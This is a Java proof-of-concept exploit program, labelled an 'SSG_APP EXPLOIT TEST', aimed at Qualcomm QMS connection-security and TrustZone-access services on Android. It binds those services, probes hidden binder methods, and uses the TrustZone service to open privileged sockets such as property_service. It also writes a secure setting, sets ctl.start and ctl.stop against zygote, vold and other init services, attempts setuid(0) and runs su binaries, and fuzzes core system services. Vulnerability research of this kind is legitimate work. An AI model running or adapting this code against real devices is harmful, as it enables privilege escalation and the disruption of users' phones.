package com.poc;

import android.app.ActivityThread;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.os.ServiceManager;
import android.provider.Settings;
import android.text.TextUtils;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class Main {
    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static Context sContext;
    private static IServiceManager mServiceManager;
    private static IMinkSocketFd mTZService;
    private static boolean isBoundCS = false;
    private static boolean isBoundTZ = false;
    private static CountDownLatch latch = new CountDownLatch(2);
    private static StringBuilder logBuilder = new StringBuilder();
    private static AtomicBoolean stopRequested = new AtomicBoolean(false);

    private static ServiceConnection csConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("[CS] Service bound");
            latch.countDown();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mServiceManager = null;
            isBoundCS = false;
            appendLog("[CS] disconnected");
        }
    };

    private static ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("[TZ] Service bound");
            latch.countDown();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZService = null;
            isBoundTZ = false;
            appendLog("[TZ] disconnected");
        }
    };

    public static void main(String[] args) {
        // Obtain a Context for app_process
        try {
            // Use ActivityThread to get system context
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Method systemMain = activityThreadClass.getDeclaredMethod("systemMain");
            systemMain.setAccessible(true);
            Object activityThread = systemMain.invoke(null);
            Method getSystemContext = activityThreadClass.getDeclaredMethod("getSystemContext");
            getSystemContext.setAccessible(true);
            sContext = (Context) getSystemContext.invoke(activityThread);
            appendLog("[*] Context obtained: " + sContext);
        } catch (Exception e) {
            appendLog("[!] Failed to get Context: " + e.getMessage());
            System.exit(1);
        }

        appendLog("========================================");
        appendLog("========== SSG_APP EXPLOIT TEST ==========");
        appendLog("Starting at " + new Date().toString());

        // Bind services
        bindServices();

        try {
            // Wait for services to bind (max 10 seconds)
            if (!latch.await(10, TimeUnit.SECONDS)) {
                appendLog("[!] Bind timeout");
            }
        } catch (InterruptedException e) {
            appendLog("[!] Bind interrupted");
        }

        // Run tests
        if (mServiceManager != null && mTZService != null) {
            runTests();
        } else {
            appendLog("[!] Services not available, attempting fallback via ServiceManager...");
            // Fallback: try to get services directly via ServiceManager (hidden API)
            try {
                IBinder csBinder = ServiceManager.getService("connectionsecurity");
                if (csBinder != null) {
                    mServiceManager = IServiceManager.Stub.asInterface(csBinder);
                    appendLog("[CS] Got via ServiceManager");
                }
                IBinder tzBinder = ServiceManager.getService("trustzoneaccess");
                if (tzBinder != null) {
                    mTZService = IMinkSocketFd.Stub.asInterface(tzBinder);
                    appendLog("[TZ] Got via ServiceManager");
                }
                if (mServiceManager != null && mTZService != null) {
                    runTests();
                } else {
                    appendLog("[!] Fallback failed");
                }
            } catch (Exception e) {
                appendLog("[!] Fallback error: " + e.getMessage());
            }
        }

        // Finalize and exit
        appendLog("========== TEST COMPLETED ==========");
        appendLog("========================================");
        saveLog();
        System.exit(0);
    }

    private static void bindServices() {
        if (sContext == null) {
            appendLog("[!] Context is null, cannot bind");
            return;
        }
        try {
            Intent intentCS = new Intent();
            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
            isBoundCS = sContext.bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundCS) appendLog("[CS] bind failed");

            Intent intentTZ = new Intent();
            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            isBoundTZ = sContext.bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundTZ) appendLog("[TZ] bind failed");

            if (!isBoundCS && !isBoundTZ) {
                appendLog("[!] Failed to bind any service");
            }
        } catch (Exception e) {
            appendLog("[!] Bind exception: " + e.toString());
        }
    }

    private static void runTests() {
        appendLog("========== PHASE 1: CS Enumeration ==========");
        if (mServiceManager != null) {
            IBinder rticBinder = getService("rtic");
            if (rticBinder != null) {
                appendLog("[CS] rtic binder acquired");
                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
                testRticFlags(rtic);
                discoverMethods(rticBinder, "IRticService");
            } else {
                appendLog("[CS] rtic binder NULL");
            }
            IBinder tlocBinder = getService("tloc");
            if (tlocBinder != null) {
                appendLog("[CS] tloc binder acquired");
                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
                testTloc(tloc);
                discoverMethods(tlocBinder, "ITlocService");
                testTlocHiddenMethod(tlocBinder);
            } else {
                appendLog("[CS] tloc binder NULL");
            }
        } else {
            appendLog("[CS] ServiceManager not available");
        }

        appendLog("========== PHASE 2: TZAccess Socket Tests ==========");
        if (mTZService != null) {
            appendLog("[TZ] Testing socket connections...");
            String[] socketPaths = {
                "/dev/socket/minksocket",
                "/dev/socket/ssgqmig",
                "/dev/socket/mdnsd",
                "/dev/socket/tcm",
                "/dev/socket/fwmarkd",
                "/dev/socket/dnsproxyd",
                "/dev/socket/logd",
                "/dev/socket/property_service"
            };
            for (String path : socketPaths) {
                if (stopRequested.get()) break;
                testSocket(path);
            }
        } else {
            appendLog("[TZ] TZ service not available");
        }

        appendLog("========== PHASE 3: File System Exploration ==========");
        exploreDeepFiles();

        appendLog("========== PHASE 4: Settings Write Test ==========");
        testSettingsWrite();

        appendLog("========== PHASE 5: SystemProperties Manipulation ==========");
        testSystemProperties();

        appendLog("========== PHASE 6: setuid 0 Bruteforce Attempts ==========");
        attemptSetuid0();

        appendLog("========== PHASE 7: Binder Transaction Fuzzing ==========");
        fuzzBinderTransactions();

        appendLog("========== ALL TESTS COMPLETED ==========");
    }

    private static IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("  Got " + serviceName + " binder, status=" + status[0]);
                return binder;
            } else {
                appendLog("  " + serviceName + " failed, status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
            return null;
        }
    }

    private static void testRticFlags(IRticService rtic) {
        appendLog("[RTIC] Testing flags...");
        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
        for (long flag : flags) {
            try {
                int[] status = new int[1];
                int[] ret = new int[1];
                byte[] data = rtic.getRticData(flag, status, ret, false);
                appendLog("  Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            } catch (RemoteException e) {
                appendLog("  RemoteException for flag " + flag + ": " + e.getMessage());
            }
        }
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = rtic.getRticData(0, status, ret, true);
            appendLog("  z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        }
    }

    private static void testTloc(ITlocService tloc) {
        appendLog("[TLOC] Testing...");
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("  getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            int warmup = tloc.tlocWarmUp();
            appendLog("  tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        }
    }

    private static void testTlocHiddenMethod(IBinder binder) {
        appendLog("[TLOC] Testing hidden method (code 2)...");
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(binder.getInterfaceDescriptor());
            data.writeInt(123);
            data.writeString("test");
            boolean success = binder.transact(2, data, reply, 0);
            if (success) {
                appendLog("  Hidden method succeeded, reply size=" + reply.dataSize());
                reply.setDataPosition(0);
                try {
                    int result = reply.readInt();
                    appendLog("    readInt: " + result);
                } catch (Exception e) {}
                try {
                    String s = reply.readString();
                    appendLog("    readString: " + s);
                } catch (Exception e) {}
            } else {
                appendLog("  Hidden method failed");
            }
        } catch (Exception e) {
            appendLog("  Error: " + e.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private static void discoverMethods(IBinder binder, String name) {
        appendLog("[DISCOVER] " + name);
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("  Method " + code + " succeeded, reply size=" + reply.dataSize());
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("    readInt: " + result);
                    } catch (Exception e) {}
                } else {
                    appendLog("  Method " + code + " failed");
                }
            } catch (Exception e) {
                appendLog("  Method " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private static void testSocket(String path) {
        appendLog("[TZ] Testing: " + path);
        if (mTZService == null) {
            appendLog("  TZ service null");
            return;
        }
        ParcelFileDescriptor pfd = null;
        try {
            int[] iArr = new int[1];
            pfd = mTZService.a(path, iArr);
            if (pfd == null) {
                appendLog("  [FAIL] FD is null");
                return;
            }
            appendLog("  [SUCCESS] Got FD: " + iArr[0]);
            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
            if (fdesc == null || !fdesc.valid()) {
                appendLog("  FD invalid");
                pfd.close();
                return;
            }
            java.io.OutputStream os = new java.io.FileOutputStream(fdesc);
            java.io.InputStream is = new java.io.FileInputStream(fdesc);
            String cmd = "help\n";
            os.write(cmd.getBytes(StandardCharsets.UTF_8));
            os.flush();
            byte[] buf = new byte[512];
            int len = is.read(buf);
            if (len > 0) {
                String resp = new String(buf, 0, len, StandardCharsets.UTF_8);
                appendLog("  Response: " + resp.trim());
            } else {
                appendLog("  No response");
            }
            os.close();
            is.close();
            pfd.close();
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("  Error: " + e.getMessage());
        }
    }

    private static void exploreDeepFiles() {
        appendLog("[FS] Deep file exploration...");
        String[] procFiles = {
            "/proc/self/status",
            "/proc/self/maps",
            "/proc/self/smaps",
            "/proc/self/limits",
            "/proc/self/statm",
            "/proc/self/cgroup",
            "/proc/version",
            "/proc/meminfo",
            "/proc/cpuinfo"
        };
        for (String p : procFiles) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }
        File tmp = new File("/data/local/tmp");
        if (tmp.exists()) {
            appendLog("[FS] /data/local/tmp exists, canRead=" + tmp.canRead());
            if (tmp.canRead()) {
                File[] children = tmp.listFiles();
                if (children != null) {
                    for (File f : children) {
                        appendLog("  " + f.getName());
                    }
                }
            }
        } else {
            appendLog("[FS] /data/local/tmp not exist");
        }
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists()) {
            File test = new File(download, "poc_write_test.txt");
            try (FileOutputStream fos = new FileOutputStream(test)) {
                fos.write("test\n".getBytes(StandardCharsets.UTF_8));
                appendLog("[FS] Write test succeeded");
            } catch (Exception e) {
                appendLog("[FS] Write test failed: " + e.getMessage());
            }
        }
    }

    private static void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists()) {
            appendLog("[FS] " + path + " does not exist");
            return;
        }
        if (!f.canRead()) {
            appendLog("[FS] " + path + " not readable");
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[1024];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("[FS] " + path + " content: " + content.trim());
            } else {
                appendLog("[FS] " + path + " empty");
            }
        } catch (Exception e) {
            appendLog("[FS] " + path + " error: " + e.getMessage());
        }
    }

    private static void testSettingsWrite() {
        appendLog("[SETTINGS] WRITE_SECURE_SETTINGS test...");
        try {
            String current = Settings.Global.getString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("  Current value: " + (current == null ? "(null)" : current));
            boolean success = Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("  [SUCCESS] WRITE_SECURE_SETTINGS works");
                Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("  [FAIL] WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("  Exception: " + e.getMessage());
        }
    }

    private static void testSystemProperties() {
        appendLog("[SYS] SystemProperties manipulation...");
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method setMethod = spClass.getDeclaredMethod("set", String.class, String.class);
            Method getMethod = spClass.getDeclaredMethod("get", String.class);
            setMethod.setAccessible(true);
            getMethod.setAccessible(true);

            // Try to set a test property
            String prop = "persist.test.poc";
            String val = "1";
            appendLog("  Setting " + prop + "=" + val);
            setMethod.invoke(null, prop, val);
            String read = (String) getMethod.invoke(null, prop);
            appendLog("  Read back: " + read);

            // Try to set ctl.start for init services (privileged)
            String[] ctlProps = {"ctl.start", "ctl.stop"};
            String[] testServices = {"surfaceflinger", "zygote", "audioserver", "netd", "vold"};
            for (String ctl : ctlProps) {
                for (String svc : testServices) {
                    try {
                        appendLog("  Trying " + ctl + "=" + svc);
                        setMethod.invoke(null, ctl, svc);
                        appendLog("    [SUCCESS] " + ctl + " set to " + svc);
                    } catch (Exception e) {
                        appendLog("    [FAIL] " + ctl + "=" + svc + " - " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            appendLog("  SystemProperties error: " + e.getMessage());
        }
    }

    private static void attemptSetuid0() {
        appendLog("[SETUID] Attempting various setuid 0 techniques...");

        // 1. Try via reflection on Process
        try {
            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
            setuid.setAccessible(true);
            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
            appendLog("  Runtime.setuid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Runtime.setuid failed: " + e.getMessage());
        }

        // 2. Try via libcore.io.IoUtils or Os
        try {
            Class<?> osClass = Class.forName("libcore.io.Os");
            Method setuidMethod = osClass.getMethod("setuid", int.class);
            // Need to get instance: OsConstants? Actually Libcore.os
            Class<?> libcore = Class.forName("libcore.io.Libcore");
            Field osField = libcore.getField("os");
            Object os = osField.get(null);
            setuidMethod.invoke(os, 0);
            appendLog("  Os.setuid(0) succeeded?");
        } catch (Exception e) {
            appendLog("  Os.setuid failed: " + e.getMessage());
        }

        // 3. Try via android.os.Process.setuid (if exists)
        try {
            Class<?> processClass = Class.forName("android.os.Process");
            Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
            setuidMethod.setAccessible(true);
            int result = (int) setuidMethod.invoke(null, 0);
            appendLog("  Process.setuid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Process.setuid failed: " + e.getMessage());
        }

        // 4. Try via JNI? Not possible from Java.

        // 5. Try exploiting setuid binaries via File API (if any suid binary exists)
        String[] suidCandidates = {
            "/system/bin/su",
            "/system/xbin/su",
            "/system/bin/sh",
            "/system/bin/run-as",
            "/system/bin/ping"
        };
        for (String path : suidCandidates) {
            File f = new File(path);
            if (f.exists()) {
                appendLog("  Found " + path + ", canExecute=" + f.canExecute());
                // Try to execute? But external exec is restricted.
                try {
                    Process p = Runtime.getRuntime().exec(path + " -c id");
                    // read output
                    java.io.InputStream is = p.getInputStream();
                    byte[] buf = new byte[1024];
                    int len = is.read(buf);
                    if (len > 0) {
                        appendLog("    Output: " + new String(buf, 0, len).trim());
                    }
                    p.waitFor();
                } catch (Exception e) {
                    appendLog("    Exec failed: " + e.getMessage());
                }
            }
        }
    }

    private static void fuzzBinderTransactions() {
        appendLog("[FUZZ] Fuzzing binder transactions on system services...");
        // Try to get some system services
        String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm"};
        for (String svc : services) {
            try {
                IBinder binder = ServiceManager.getService(svc);
                if (binder == null) continue;
                appendLog("  Fuzzing " + svc);
                for (int code = 1; code <= 50; code++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        // Try to write a generic interface token (might fail)
                        data.writeInterfaceToken("android." + svc + ".I" + svc + "Service");
                        boolean success = binder.transact(code, data, reply, 0);
                        if (success) {
                            appendLog("    Code " + code + " succeeded, reply size=" + reply.dataSize());
                        }
                    } catch (Exception e) {
                        // ignore
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                }
            } catch (Exception e) {
                appendLog("  Failed to get " + svc + ": " + e.getMessage());
            }
        }
    }

    private static void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        System.out.print(line); // Also print to console
    }

    private static void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir == null || (!dir.exists() && !dir.mkdirs())) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "ssg_app_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== SSG_APP PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }
}
